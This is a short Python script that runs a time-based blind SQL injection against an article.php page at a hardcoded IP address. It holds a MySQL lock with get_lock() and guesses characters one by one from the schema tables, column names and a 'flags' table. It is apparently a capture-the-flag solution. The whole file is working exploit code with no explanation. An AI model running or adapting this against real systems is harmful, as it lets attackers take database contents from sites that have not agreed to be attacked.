# -*- coding: utf-8 -*-
import requests
import time
url1 = "http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23"
r = requests.get(url=url1)
time.sleep(90)
# 加锁后变换身份
url2 = "http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23"
data = ""
for i in range(1,1000):
    print i
    for j in range(33,127):
        #payload = "(ascii(substr((database()),%s,1))=%s)"%(i,j) #post
        payload = "(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)" % (i, j) #article,flags
        #payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)" % (i, j) #flag
        #payload = "(ascii(substr((select flag from flags limit 1),%s,1))=%s)" % (i, j)
        payload_url = url2%(payload)
        try:
            s = requests.get(url=payload_url,timeout=4.5)
        except:
            data +=chr(j)
            print data
            break